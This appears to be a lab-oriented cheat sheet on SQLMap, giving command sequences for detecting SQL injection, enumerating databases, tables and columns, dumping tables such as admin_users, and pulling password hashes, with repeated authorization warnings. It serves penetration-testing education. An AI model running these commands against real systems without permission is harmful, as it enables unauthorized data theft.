# SQLMap

SQLMap is an open-source penetration testing tool that automates detecting and exploiting SQL injection vulnerabilities.

It can identify injection points, fingerprint the database, enumerate databases and tables, dump data, and assist with deeper testing.

!!! warning
    SQLMap can send many requests and may be noisy. Only use it against systems you own or have explicit permission to test.

---

## When to Use SQLMap

SQLMap is useful after you identify or suspect SQL injection.

Good use cases:

- Authorized labs
- CTFs
- Internal assessments
- Bug bounty targets in scope
- Confirming manually discovered SQLi
- Enumerating database structure safely

Avoid running it blindly against public targets without permission.

---

## Basic GET Parameter Test

Example target:

```text
http://sqlmaptesting.thm/search?cat=1
```

Basic scan:

```bash
sqlmap -u "http://sqlmaptesting.thm/search?cat=1"
```

SQLMap will test the parameter and try to determine whether it is injectable.

---

## Non-Interactive Mode

Use `--batch` to automatically answer prompts with defaults.

```bash
sqlmap -u "http://sqlmaptesting.thm/search?cat=1" --batch
```

This is useful for labs or repeatable testing.

---

## Wizard Mode

SQLMap includes an interactive wizard.

```bash
sqlmap --wizard
```

This walks through target setup and scan depth.

It can be useful for beginners, but learning the flags is better long term.

---

## Database Enumeration Workflow

Once SQLMap confirms SQL injection, use a structured workflow.

### 1. List Databases

```bash
sqlmap -u "http://sqlmaptesting.thm/search?cat=1" --dbs
```

### 2. List Tables in a Database

```bash
sqlmap -u "http://sqlmaptesting.thm/search?cat=1" -D user_registration --tables
```

### 3. List Columns in a Table

```bash
sqlmap -u "http://sqlmaptesting.thm/search?cat=1" -D user_registration -T admin_users --columns
```

### 4. Dump a Table

```bash
sqlmap -u "http://sqlmaptesting.thm/search?cat=1" -D user_registration -T admin_users --dump
```

---

## Common Flags

| Flag | Purpose |
|---|---|
| `-u <URL>` | Target URL |
| `--batch` | Use default answers |
| `--dbs` | List databases |
| `-D <database>` | Select database |
| `--tables` | List tables |
| `-T <table>` | Select table |
| `--columns` | List columns |
| `-C <columns>` | Select columns |
| `--dump` | Dump selected data |
| `--wizard` | Interactive guided mode |

---

## Testing POST Requests

Many SQLi points are in POST body parameters.

Save a raw HTTP request from Burp Suite to a file:

```text
request.txt
```

Then run:

```bash
sqlmap -r request.txt --batch
```

This is often cleaner than manually reconstructing complex requests.

---

## Testing a Specific Parameter

Use `-p` to tell SQLMap which parameter to test.

```bash
sqlmap -u "http://example.com/search?cat=1&sort=asc" -p cat --batch
```

This reduces unnecessary testing.

---

## Cookies and Authenticated Testing

If the vulnerable functionality requires login, include the session cookie.

```bash
sqlmap -u "http://example.com/account?id=1" \
  --cookie="session=abc123" \
  --batch
```

For more complex authenticated requests, prefer:

```bash
sqlmap -r request.txt --batch
```

---

## Risk and Level

SQLMap can increase test intensity using `--risk` and `--level`.

```bash
sqlmap -u "http://example.com/item?id=1" --risk=2 --level=3 --batch
```

General idea:

| Option | Meaning |
|---|---|
| `--level` | Number of tests and locations tested |
| `--risk` | Potential impact of payloads |

Higher values can be more intrusive.

!!! warning
    Do not increase risk or level on production systems unless the assessment scope explicitly allows it.

---

## Output Directory

SQLMap saves results in an output directory.

You can choose one:

```bash
sqlmap -u "http://example.com/item?id=1" --output-dir=sqlmap-output
```

This helps keep evidence organized.

---

## Useful Options

| Option | Purpose |
|---|---|
| `--current-db` | Show current database |
| `--current-user` | Show database user |
| `--hostname` | Show DBMS host name |
| `--banner` | Show DBMS banner |
| `--is-dba` | Check DBA privileges |
| `--passwords` | Attempt to enumerate password hashes |
| `--forms` | Parse and test forms |
| `--crawl=<depth>` | Crawl site links |
| `--threads=<n>` | Use multiple threads |

Use these carefully and only when authorized.

---

## Practical Workflow

A clean lab workflow:

```bash
# 1. Basic detection
sqlmap -u "http://target/search?cat=1" --batch

# 2. Enumerate databases
sqlmap -u "http://target/search?cat=1" --dbs --batch

# 3. Enumerate tables
sqlmap -u "http://target/search?cat=1" -D appdb --tables --batch

# 4. Enumerate columns
sqlmap -u "http://target/search?cat=1" -D appdb -T users --columns --batch

# 5. Dump selected table
sqlmap -u "http://target/search?cat=1" -D appdb -T users --dump --batch
```

---

## Using Burp Requests

For real testing, using a captured request is often best.

1. Capture the request in Burp Suite.
2. Right click and copy/save the raw request.
3. Save it as `request.txt`.
4. Run SQLMap.

```bash
sqlmap -r request.txt --batch
```

Benefits:

- Preserves cookies
- Preserves headers
- Preserves POST data
- Preserves JSON body
- Avoids manual formatting mistakes

---

## Noise and Safety

SQLMap is powerful but noisy.

Risks:

- Many requests in a short time
- IDS/IPS alerts
- WAF blocking
- Account lockouts
- Large database dumps
- Possible performance impact

Safer habits:

- Get written authorization.
- Start with low intensity.
- Test one parameter at a time.
- Avoid destructive options.
- Limit dumps to proof-of-concept data.
- Document commands and timestamps.
- Stop if the system becomes unstable.

---

## Quick Reference

| Goal | Command |
|---|---|
| Basic test | `sqlmap -u "URL"` |
| Non-interactive | `sqlmap -u "URL" --batch` |
| List DBs | `sqlmap -u "URL" --dbs` |
| List tables | `sqlmap -u "URL" -D db --tables` |
| List columns | `sqlmap -u "URL" -D db -T table --columns` |
| Dump table | `sqlmap -u "URL" -D db -T table --dump` |
| Use raw request | `sqlmap -r request.txt` |
| Test parameter | `sqlmap -u "URL" -p id` |
| Use cookie | `sqlmap -u "URL" --cookie="session=value"` |

---

## Notes to Remember

- SQLMap automates SQL injection testing.
- Confirm scope before running it.
- `-u` tests a URL.
- `-r` uses a saved raw HTTP request.
- `--dbs`, `--tables`, `--columns`, and `--dump` are the common enumeration chain.
- `--batch` avoids interactive prompts.
- Use `-p` to focus on one parameter.
- Higher `--risk` and `--level` increase intensity.
- SQLMap is helpful, but manual understanding of SQLi is still important.